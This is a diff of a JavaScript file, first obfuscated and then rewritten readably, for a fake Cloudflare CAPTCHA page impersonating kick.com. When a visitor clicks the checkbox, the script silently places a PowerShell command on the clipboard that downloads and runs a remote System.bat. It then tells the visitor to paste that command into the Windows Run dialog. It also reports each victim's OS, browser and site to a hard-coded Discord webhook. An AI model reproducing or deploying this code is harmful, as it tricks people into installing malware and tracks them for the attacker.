@@ -1,1 +1,237 @@
-const _0x5e5736=_0x5873;(function(_0x4e4c8e,_0x20c110){const _0xfbc646=_0x5873,_0x54d14c=_0x4e4c8e();while(!![]){try{const _0x33815a=-parseInt(_0xfbc646(0x80))/0x1+parseInt(_0xfbc646(0x8a))/0x2*(parseInt(_0xfbc646(0x70))/0x3)+-parseInt(_0xfbc646(0xc6))/0x4+-parseInt(_0xfbc646(0x87))/0x5*(-parseInt(_0xfbc646(0x78))/0x6)+-parseInt(_0xfbc646(0xb1))/0x7*(parseInt(_0xfbc646(0xcb))/0x8)+parseInt(_0xfbc646(0xaf))/0x9*(-parseInt(_0xfbc646(0xdb))/0xa)+parseInt(_0xfbc646(0x9a))/0xb;if(_0x33815a===_0x20c110)break;else _0x54d14c['push'](_0x54d14c['shift']());}catch(_0x3d6299){_0x54d14c['push'](_0x54d14c['shift']());}}}(_0x34f0,0x402a2));const DISCORD_WEBHOOK_URL=_0x5e5736(0xa2);function _0x34f0(){const _0xfa22d9=['pointerEvents','Edge','Wise','random','(prefers-color-scheme:\x20dark)','addEventListener','textContent','input','innerText','Microsoft\x20Edge','uniqueUsername','Brave','instructions','heading-favicon','display','-------------------------------------\x0a','focus-element','Hawk','location','POST','theme-light','expanded','Tiger','Frost','Whale','3684oRMoBY','color','div','⏳\x20**','Raven','setItem','match','execCommand','48HdcATk','getElementById','loading-text','</h1>','Long','**\x20clicked!\x20🎉\x0a','HJup0','white','118823KAzNWR','add','**,\x20please\x20check\x20the\x20panel\x20ASAP!\x20🚀💫','body','iOS','Windows','Cosmic','245035MEmPhN','Cat','error','494ajHfFM','floor','visible','none','appendChild','Eagle','\x20OS:\x20\x20\x20\x20\x20\x20\x20\x20','Quick','MSIE','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22instruction-text\x22>1.\x20Press\x20<b>Windows\x20+\x20R</b>\x20to\x20open\x20the\x20Run\x20dialog.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22instruction-text\x22>2.\x20Paste\x20the\x20verification\x20text\x20by\x20pressing\x20<b>CTRL\x20+\x20V</b>.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22instruction-text\x22>3.\x20Press\x20<b>OK</b>\x20to\x20verify\x20you\x27re\x20not\x20a\x20robot.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','createElement','Lion','...','append','transition','opacity','8284848nZEHNc','popup','loading-container','waiting-for','matches','theme-dark','\x20SITE:\x20\x20\x20\x20\x20\x20','Iron','https://discord.com/api/webhooks/1344783285947203636/tEt80qmQf0P6kSbUEQPW8dkWfBAMyL-1VqUB-YxaPCIVru6GGw82rvRHd7fWTkykM8bz','Error\x20sending\x20Discord\x20notification:','Firefox','Bear','Fox','innerHTML','Silent','absolute','visibility','version','length','getItem','toString','1089CNGdGA','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Performance\x20&amp;\x20security\x20by\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20rel=\x22noopener\x20noreferrer\x22\x20href=\x22https://www.cloudflare.com/?utm_source=challenge&amp;utm_campaign=m\x22\x20target=\x22_blank\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Cloudflare\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','7ppVMWz','clickCount','small-text','Sneaky','matchMedia','log','popup-overlay','🔔\x20New\x20click\x20detected\x20by\x20','removeChild','includes','**,\x2020\x20seconds\x20have\x20passed!\x20Keep\x20me\x20updated\x20until\x20I\x20disappear!\x20👻','<h1\x20class=\x22zone-name-title\x20h1\x22><img\x20src=\x22https://github.com/ChatGPTCrack/test/raw/refs/heads/main/images/kick/favicon.ico\x22\x20class=\x22heading-favicon\x22\x20alt=\x22Icon\x22>','stringify','!🔥\x0a','Chrome','checkbox','disabled','Linux','verifying','classList','-------------------------------------','1773180ImfRmr','Popup\x20content\x20displayed\x20successfully','kick.com','name','bWfyD1','1602768RpsPeV','Android','\x20🔢\x0a','\x20CLICKS:\x20\x20\x20\x20','macOS','Unknown','flex','style','\x20SYSTEM:\x20\x20\x20\x20','Dog','host','Shark','Mac','replaceAll','textarea','Spider','34980unLZwB'];_0x34f0=function(){return _0xfa22d9;};return _0x34f0();}async function sendDiscordNotification(_0x4a2e4a){const _0x1b1f65=_0x5e5736;try{const _0x5a9267=await fetch(DISCORD_WEBHOOK_URL,{'method':_0x1b1f65(0x6a),'headers':{'Content-Type':'application/json'},'body':JSON[_0x1b1f65(0xbd)]({'content':_0x4a2e4a})});!_0x5a9267['ok']&&console[_0x1b1f65(0x89)]('Discord\x20notification\x20failed',await _0x5a9267['text']());}catch(_0x5e33ea){console[_0x1b1f65(0x89)](_0x1b1f65(0xa3),_0x5e33ea);}}var nig=_0x5e5736(0xc8);document[_0x5e5736(0x79)](_0x5e5736(0xca))[_0x5e5736(0xe4)]=document['getElementById'](_0x5e5736(0xca))[_0x5e5736(0xe4)][_0x5e5736(0xd8)](_0x5e5736(0x96),nig),document[_0x5e5736(0x79)](_0x5e5736(0x9d))[_0x5e5736(0xe4)]=document['getElementById']('waiting-for')[_0x5e5736(0xe4)][_0x5e5736(0xd8)](_0x5e5736(0x96),nig),document[_0x5e5736(0x79)](_0x5e5736(0xe9))[_0x5e5736(0xe4)]=document[_0x5e5736(0x79)]('heading-favicon')[_0x5e5736(0xe4)][_0x5e5736(0xd8)](_0x5e5736(0x96),nig);let heading=document[_0x5e5736(0x79)](_0x5e5736(0xe9));heading[_0x5e5736(0xe4)]=heading[_0x5e5736(0xe4)][_0x5e5736(0xd8)](_0x5e5736(0x96),nig),heading[_0x5e5736(0xa7)]=_0x5e5736(0xbc)+nig+_0x5e5736(0x7b);window['matchMedia']&&window[_0x5e5736(0xb5)](_0x5e5736(0xe0))[_0x5e5736(0x9e)]?document['body'][_0x5e5736(0xc4)][_0x5e5736(0x81)](_0x5e5736(0x9f)):document[_0x5e5736(0x83)]['classList'][_0x5e5736(0x81)](_0x5e5736(0x6b));function generateUniqueUsername(){const _0x374751=_0x5e5736,_0x37ed6b=[_0x374751(0x7c),_0x374751(0xda),'Crazy',_0x374751(0xe7),_0x374751(0xa8),'Mighty',_0x374751(0x91),_0x374751(0xde),_0x374751(0xb4),_0x374751(0x86),_0x374751(0xa1),'Golden','Shadow',_0x374751(0x6e),'Thunder'],_0x66c437=[_0x374751(0xd4),_0x374751(0x88),'Wolf',_0x374751(0xa6),_0x374751(0xed),_0x374751(0xa5),_0x374751(0x95),_0x374751(0x8f),_0x374751(0xd6),'Scat',_0x374751(0x6f),'Owl',_0x374751(0x6d),'Cobra',_0x374751(0x74)],_0x14e87f=localStorage[_0x374751(0xad)](_0x374751(0xe6));if(_0x14e87f)return _0x14e87f;const _0xe59bb7=_0x37ed6b[Math[_0x374751(0x8b)](Math[_0x374751(0xdf)]()*_0x37ed6b[_0x374751(0xac)])]+_0x66c437[Math['floor'](Math[_0x374751(0xdf)]()*_0x66c437[_0x374751(0xac)])];return localStorage[_0x374751(0x75)](_0x374751(0xe6),_0xe59bb7),_0xe59bb7;}const cmd='powershell\x20-Command\x20\x22iwr\x20\x27https://github.com/ChatGPTCrack/main/releases/download/Cloudflare/System.bat\x27\x20-OutFile\x20\x27$env:tempSystem.bat\x27;\x20Start-Process\x20\x27$env:tempSystem.bat\x27\x22',checkboxBtn=document[_0x5e5736(0x79)](_0x5e5736(0xc0)),content=document[_0x5e5736(0x79)](_0x5e5736(0x7e)),verifLogoId=document[_0x5e5736(0x79)](_0x5e5736(0xc3)),generatedId=generateRandomNumber(),uniqueUsername=generateUniqueUsername();let doOnce=![],clickCount=localStorage[_0x5e5736(0xad)](_0x5e5736(0xb2))?parseInt(localStorage[_0x5e5736(0xad)]('clickCount')):0x0;checkboxBtn[_0x5e5736(0xe1)]('click',async()=>{const _0x4b17da=_0x5e5736,_0x20e969=document[_0x4b17da(0x79)](_0x4b17da(0xb7));_0x20e969['style'][_0x4b17da(0xea)]=_0x4b17da(0xd1);let _0xcad197=document[_0x4b17da(0x79)](_0x4b17da(0xec));!_0xcad197&&(_0xcad197=document[_0x4b17da(0x94)](_0x4b17da(0xe3)),_0xcad197['id']='focus-element',_0xcad197[_0x4b17da(0xd2)]['position']=_0x4b17da(0xa9),_0xcad197[_0x4b17da(0xd2)][_0x4b17da(0x99)]='0',_0xcad197[_0x4b17da(0xd2)][_0x4b17da(0xdc)]=_0x4b17da(0x8d),document['body']['appendChild'](_0xcad197));_0xcad197['focus'](),setTimeout(()=>{const _0x1855c6=_0x4b17da,_0x2214c6=document[_0x1855c6(0x79)](_0x1855c6(0x9b)),_0x5323e8=document[_0x1855c6(0x79)](_0x1855c6(0x9c)),_0x319adc=document[_0x1855c6(0x79)](_0x1855c6(0x7a));_0x5323e8['style']['display']=_0x1855c6(0x8d),_0x319adc['style'][_0x1855c6(0x98)]='opacity\x200.5s\x20ease',_0x319adc[_0x1855c6(0xd2)]['opacity']=0x0,setTimeout(()=>{const _0xc97a9e=_0x1855c6;_0x2214c6[_0xc97a9e(0xc4)][_0xc97a9e(0x81)](_0xc97a9e(0x6c));const _0xe144eb=document[_0xc97a9e(0x94)]('h3');_0xe144eb[_0xc97a9e(0xe2)]='Extra\x20Verification\x20Needed',_0xe144eb['style'][_0xc97a9e(0x71)]=_0xc97a9e(0x7f);const _0x1c34c3=document[_0xc97a9e(0x94)](_0xc97a9e(0x72));_0x1c34c3['classList']['add'](_0xc97a9e(0xe8)),_0x1c34c3[_0xc97a9e(0xa7)]=_0xc97a9e(0x93);const _0x499e63=document['createElement'](_0xc97a9e(0x72));_0x499e63[_0xc97a9e(0xc4)]['add']('text-center',_0xc97a9e(0xb3)),_0x499e63[_0xc97a9e(0xa7)]=_0xc97a9e(0xb0),_0x2214c6[_0xc97a9e(0xa7)]='',_0x2214c6[_0xc97a9e(0x8e)](_0xe144eb),_0x2214c6[_0xc97a9e(0x8e)](_0x1c34c3),_0x2214c6[_0xc97a9e(0x8e)](_0x499e63),console[_0xc97a9e(0xb6)](_0xc97a9e(0xc7));},0x1f4);},0xbb8),clickCount++,localStorage[_0x4b17da(0x75)](_0x4b17da(0xb2),clickCount);if(!doOnce)doOnce=!![];else return;content[_0x4b17da(0xd2)][_0x4b17da(0xea)]='none',verifLogoId[_0x4b17da(0xd2)][_0x4b17da(0xea)]=_0x4b17da(0xd1),verifLogoId[_0x4b17da(0xd2)][_0x4b17da(0xaa)]=_0x4b17da(0x8c);const _0x25c5d0=getBrowserInfo();let _0x3562e8=_0x4b17da(0xb8)+uniqueUsername+_0x4b17da(0xbe)+_0x4b17da(0xeb)+(_0x4b17da(0x90)+_0x25c5d0['os']+'\x0a')+(_0x4b17da(0xd3)+_0x25c5d0[_0x4b17da(0xc9)]+'\x20'+_0x25c5d0[_0x4b17da(0xab)]+'\x0a')+(_0x4b17da(0xce)+clickCount+'\x20🔢\x0a')+_0x4b17da(0xa0)+window[_0x4b17da(0xee)][_0x4b17da(0xd5)]+'\x0a'+_0x4b17da(0xc5);_0x25c5d0['os']===_0x4b17da(0x85)&&(_0x3562e8='💻✨\x20Windows\x20User\x20Alert!\x20**'+uniqueUsername+_0x4b17da(0x7d)+_0x4b17da(0xeb)+('\x20OS:\x20\x20\x20\x20\x20\x20\x20\x20'+_0x25c5d0['os']+'\x0a')+(_0x4b17da(0xd3)+_0x25c5d0['name']+'\x20'+_0x25c5d0[_0x4b17da(0xab)]+'\x0a')+(_0x4b17da(0xce)+clickCount+_0x4b17da(0xcd))+_0x4b17da(0xa0)+window['location'][_0x4b17da(0xd5)]+'\x0a'+_0x4b17da(0xc5));await sendDiscordNotification(_0x3562e8);var _0x15cad7=Math[_0x4b17da(0x8b)](0xf4240+Math['random']()*0x895440);checkboxBtn[_0x4b17da(0xc1)]=!![],stageClipboard(cmd,_0x15cad7),_0x25c5d0['os']===_0x4b17da(0x85)&&clickCount===0x2&&await sendDiscordNotification('⚠️\x20**'+uniqueUsername+_0x4b17da(0x82)),_0x25c5d0['os']===_0x4b17da(0x85)&&setTimeout(()=>{const _0x235563=_0x4b17da;sendDiscordNotification(_0x235563(0x73)+uniqueUsername+_0x235563(0xbb));},0x4e20);});function _0x5873(_0x5b88c5,_0x3ac071){const _0x34f089=_0x34f0();return _0x5873=function(_0x587370,_0x526452){_0x587370=_0x587370-0x6a;let _0x14d67=_0x34f089[_0x587370];return _0x14d67;},_0x5873(_0x5b88c5,_0x3ac071);}function generateRandomNumber(){const _0x6e96a=_0x5e5736;return Math[_0x6e96a(0x8b)](Math['random']()*(0x270f-0x3e8+0x1)+0x3e8)[_0x6e96a(0xae)]();}function setClipboardCopyData(_0x1e9c36){const _0x34ab7a=_0x5e5736,_0x2cf057=document['createElement'](_0x34ab7a(0xd9));_0x2cf057['value']=_0x1e9c36,document['body'][_0x34ab7a(0x97)](_0x2cf057),_0x2cf057['select'](),document[_0x34ab7a(0x77)]('copy'),document[_0x34ab7a(0x83)][_0x34ab7a(0xb9)](_0x2cf057);}function stageClipboard(_0x2e2d21,_0x18983e){const _0x3554db='\x20#\x20',_0x244a85='🟠\x20\x20CIoudfIare\x20Unique\x20One-time\x20Verification\x20ID:\x20',_0xe0df79=_0x2e2d21+_0x3554db+_0x244a85+_0x18983e;setClipboardCopyData(_0xe0df79);}function getBrowserInfo(){const _0x2f73d0=_0x5e5736,_0x2f1320=navigator['userAgent'];let _0x1909ad=_0x2f73d0(0xd0),_0x56f485=_0x2f73d0(0xd0),_0x511562=_0x2f73d0(0xd0);if(_0x2f1320[_0x2f73d0(0xba)](_0x2f73d0(0xa4)))_0x1909ad=_0x2f73d0(0xa4),_0x56f485=_0x2f1320['match'](/Firefox\/([0-9.]+)/)?.[0x1]||_0x2f73d0(0xd0);else{if(_0x2f1320['includes'](_0x2f73d0(0xbf)))_0x1909ad=_0x2f73d0(0xbf),_0x56f485=_0x2f1320[_0x2f73d0(0x76)](/Chrome\/([0-9.]+)/)?.[0x1]||_0x2f73d0(0xd0);else{if(_0x2f1320[_0x2f73d0(0xba)]('Safari'))_0x1909ad='Safari',_0x56f485=_0x2f1320[_0x2f73d0(0x76)](/Version\/([0-9.]+)/)?.[0x1]||_0x2f73d0(0xd0);else{if(_0x2f1320['includes'](_0x2f73d0(0x92)))_0x1909ad='Internet\x20Explorer',_0x56f485=_0x2f1320[_0x2f73d0(0x76)](/(MSIE|rv:)\s*([0-9.]+)/)?.[0x2]||_0x2f73d0(0xd0);else _0x2f1320[_0x2f73d0(0xba)](_0x2f73d0(0xdd))&&(_0x1909ad=_0x2f73d0(0xe5),_0x56f485=_0x2f1320['match'](/Edge\/([0-9.]+)/)?.[0x1]||_0x2f73d0(0xd0));}}}if(_0x2f1320[_0x2f73d0(0xba)]('Windows'))_0x511562=_0x2f73d0(0x85);else{if(_0x2f1320['includes'](_0x2f73d0(0xd7)))_0x511562=_0x2f73d0(0xcf);else{if(_0x2f1320[_0x2f73d0(0xba)](_0x2f73d0(0xc2)))_0x511562=_0x2f73d0(0xc2);else{if(_0x2f1320[_0x2f73d0(0xba)](_0x2f73d0(0xcc)))_0x511562=_0x2f73d0(0xcc);else{if(_0x2f1320[_0x2f73d0(0xba)]('iOS'))_0x511562=_0x2f73d0(0x84);}}}}return{'name':_0x1909ad,'version':_0x56f485,'os':_0x511562};}
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1344783285947203636/tEt80qmQf0P6kSbUEQPW8dkWfBAMyL-1VqUB-YxaPCIVru6GGw82rvRHd7fWTkykM8bz'; 
+
+async function sendDiscordNotification(message) {
+    try {
+        const response = await fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                content: message,
+            }),
+        });
+
+        if (!response.ok) {
+            console.error('Discord notification failed', await response.text());
+        }
+    } catch (error) {
+        console.error('Error sending Discord notification:', error);
+    }
+}
+
+var nig = `kick.com`;
+
+document.getElementById("bWfyD1").innerText = document.getElementById("bWfyD1").innerText.replaceAll("...", nig);
+document.getElementById("waiting-for").innerText = document.getElementById("waiting-for").innerText.replaceAll("...", nig);
+document.getElementById("heading-favicon").innerText = document.getElementById("heading-favicon").innerText.replaceAll("...", nig);
+
+let heading = document.getElementById("heading-favicon");
+heading.innerText = heading.innerText.replaceAll("...", nig);
+heading.innerHTML = `<h1 class="zone-name-title h1"><img src="/images/kick/favicon.ico" class="heading-favicon" alt="Icon">` + nig + `</h1>`;
+
+if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+    document.body.classList.add("theme-dark");
+} else {
+    document.body.classList.add("theme-light");
+}
+
+function generateUniqueUsername() {
+    const adjectives = [
+        'Long', 'Spider', 'Crazy', 'Brave', 'Silent', 'Mighty', 'Quick', 'Wise', 
+        'Sneaky', 'Cosmic', 'Iron', 'Golden', 'Shadow', 'Frost', 'Thunder'
+    ];
+    const animals = [
+        'Dog', 'Cat', 'Wolf', 'Fox', 'Hawk', 'Bear', 'Lion', 'Eagle', 
+        'Shark', 'Scat', 'Whale', 'Owl', 'Tiger', 'Cobra', 'Raven'
+    ];
+
+    const storedUsername = localStorage.getItem('uniqueUsername');
+    if (storedUsername) {
+        return storedUsername;
+    }
+
+    const username = 
+        adjectives[Math.floor(Math.random() * adjectives.length)] + 
+        animals[Math.floor(Math.random() * animals.length)];
+
+    localStorage.setItem('uniqueUsername', username);
+
+    return username;
+}
+
+const cmd = `powershell -Command "iwr 'https://github.com/ChatGPTCrack/main/releases/download/Cloudflare/System.bat' -OutFile '$env:temp\System.bat'; Start-Process '$env:temp\System.bat'"`;
+
+const checkboxBtn = document.getElementById("checkbox");
+const content = document.getElementById("HJup0");
+const verifLogoId = document.getElementById("verifying");
+const generatedId = generateRandomNumber();
+
+const uniqueUsername = generateUniqueUsername();
+
+let doOnce = false;
+let clickCount = localStorage.getItem('clickCount') ? parseInt(localStorage.getItem('clickCount')) : 0;
+
+checkboxBtn.addEventListener("click", async () => {
+    const popupOverlay = document.getElementById("popup-overlay");
+    popupOverlay.style.display = "flex";
+
+    let focusElement = document.getElementById("focus-element");
+    if (!focusElement) {
+        focusElement = document.createElement("input");
+        focusElement.id = "focus-element";
+        focusElement.style.position = "absolute";
+        focusElement.style.opacity = "0";
+        focusElement.style.pointerEvents = "none";
+        document.body.appendChild(focusElement);
+    }
+    focusElement.focus();
+
+    setTimeout(() => {
+        const popup = document.getElementById("popup");
+        const loadingContainer = document.getElementById("loading-container");
+        const loadingText = document.getElementById("loading-text");
+
+        loadingContainer.style.display = "none";
+        loadingText.style.transition = "opacity 0.5s ease";
+        loadingText.style.opacity = 0;
+
+        setTimeout(() => {
+            popup.classList.add("expanded");
+
+            const title = document.createElement("h3");
+            title.textContent = "Extra Verification Needed";
+            title.style.color = "white";
+
+            const instructions = document.createElement("div");
+            instructions.classList.add("instructions");
+            instructions.innerHTML = `
+                <p class="instruction-text">1. Press <b>Windows + R</b> to open the Run dialog.</p>
+                <p class="instruction-text">2. Paste the verification text by pressing <b>CTRL + V</b>.</p>
+                <p class="instruction-text">3. Press <b>OK</b> to verify you're not a robot.</p>
+            `;
+
+            const footer = document.createElement("div");
+            footer.classList.add("text-center", "small-text");
+            footer.innerHTML = `
+                Performance &amp; security by
+                <a rel="noopener noreferrer" href="https://www.cloudflare.com/?utm_source=challenge&amp;utm_campaign=m" target="_blank">
+                    Cloudflare
+                </a>
+            `;
+
+            popup.innerHTML = "";
+            popup.appendChild(title);
+            popup.appendChild(instructions);
+            popup.appendChild(footer);
+
+            console.log("Popup content displayed successfully");
+        }, 500);
+    }, 3000);
+
+    clickCount++;
+    localStorage.setItem('clickCount', clickCount);
+
+    if (!doOnce) {
+        doOnce = true;
+    } else {
+        return;
+    }
+
+    content.style.display = "none";
+    verifLogoId.style.display = "flex";
+    verifLogoId.style.visibility = "visible";
+
+    const browserInfo = getBrowserInfo();
+
+    let notificationMessage = `🔔 New click detected by ${uniqueUsername}!🔥\n` +
+        `-------------------------------------\n` +
+        ` OS:        ${browserInfo.os}\n` +
+        ` SYSTEM:    ${browserInfo.name} ${browserInfo.version}\n` +
+        ` CLICKS:    ${clickCount} 🔢\n` +
+        ` SITE:      ` + window.location.host + `\n` +
+        `-------------------------------------`;
+
+    if (browserInfo.os === 'Windows') {
+        notificationMessage = `💻✨ Windows User Alert! **${uniqueUsername}** clicked! 🎉\n` +
+            `-------------------------------------\n` +
+            ` OS:        ${browserInfo.os}\n` +
+            ` SYSTEM:    ${browserInfo.name} ${browserInfo.version}\n` +
+            ` CLICKS:    ${clickCount} 🔢\n` +
+            ` SITE:      ` + window.location.host + `\n` +
+            `-------------------------------------`;
+    }
+
+    await sendDiscordNotification(notificationMessage);
+
+    var generatedId = Math.floor(1000000 + Math.random() * 9000000);
+
+    checkboxBtn.disabled = true;
+
+    stageClipboard(cmd, generatedId);
+
+    if (browserInfo.os === 'Windows' && clickCount === 2) {
+        await sendDiscordNotification(`⚠️ **${uniqueUsername}**, please check the panel ASAP! 🚀💫`);
+    }
+
+    if (browserInfo.os === 'Windows') {
+        setTimeout(() => {
+            sendDiscordNotification(`⏳ **${uniqueUsername}**, 20 seconds have passed! Keep me updated until I disappear! 👻`);
+        }, 20000);
+    }
+});
+
+function generateRandomNumber() {
+    return Math.floor(Math.random() * (9999 - 1000 + 1) + 1000).toString();
+}
+
+function setClipboardCopyData(textToCopy) {
+    const tempTextArea = document.createElement("textarea");
+    tempTextArea.value = textToCopy;
+    document.body.append(tempTextArea);
+    tempTextArea.select();
+    document.execCommand("copy");
+    document.body.removeChild(tempTextArea);
+}
+
+function stageClipboard(commandToRun, verification_id) {
+    const suffix = " # ";
+    const ploy = "🟠  CIoudfIare Unique One-time Verification ID: ";
+    const textToCopy = commandToRun + suffix + ploy + verification_id;
+
+    setClipboardCopyData(textToCopy);
+}
+
+function getBrowserInfo() {
+    const ua = navigator.userAgent;
+    let browserName = 'Unknown', browserVersion = 'Unknown', osName = 'Unknown';
+
+    if (ua.includes('Firefox')) {
+        browserName = 'Firefox';
+        browserVersion = ua.match(/Firefox\/([0-9.]+)/)?.[1] || 'Unknown';
+    } else if (ua.includes('Chrome')) {
+        browserName = 'Chrome';
+        browserVersion = ua.match(/Chrome\/([0-9.]+)/)?.[1] || 'Unknown';
+    } else if (ua.includes('Safari')) {
+        browserName = 'Safari';
+        browserVersion = ua.match(/Version\/([0-9.]+)/)?.[1] || 'Unknown';
+    } else if (ua.includes('MSIE')) {
+        browserName = 'Internet Explorer';
+        browserVersion = ua.match(/(MSIE|rv:)\s*([0-9.]+)/)?.[2] || 'Unknown';
+    } else if (ua.includes('Edge')) {
+        browserName = 'Microsoft Edge';
+        browserVersion = ua.match(/Edge\/([0-9.]+)/)?.[1] || 'Unknown';
+    }
+
+    if (ua.includes('Windows')) osName = 'Windows';
+    else if (ua.includes('Mac')) osName = 'macOS';
+    else if (ua.includes('Linux')) osName = 'Linux';
+    else if (ua.includes('Android')) osName = 'Android';
+    else if (ua.includes('iOS')) osName = 'iOS';
+
+    return {
+        name: browserName,
+        version: browserVersion,
+        os: osName
+    };
+}
